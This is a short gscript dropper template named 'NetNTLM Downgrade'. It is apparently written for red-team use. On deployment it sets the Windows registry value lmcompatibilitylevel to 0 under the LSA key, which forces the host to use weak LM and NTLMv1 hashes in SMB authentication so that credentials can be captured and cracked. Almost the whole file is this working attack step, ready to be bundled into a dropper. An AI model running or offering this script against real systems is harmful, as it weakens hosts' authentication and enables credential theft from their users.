// Example gscript template
// Title: NetNTLM Downgrade
// Author: ahhh
// Purpose: Force LM and NT hashes during SMB auth
// Gscript version: 1.0.0
// ATT&CK: 

//priority:90
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting NetNTLM Downgrade");

    var value = 0;
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\CurrentControlSet\\Control\\Lsa", "lmcompatibilitylevel", value);

    console.log("Done NetNTLM Downgrade");
    return true;
  }
  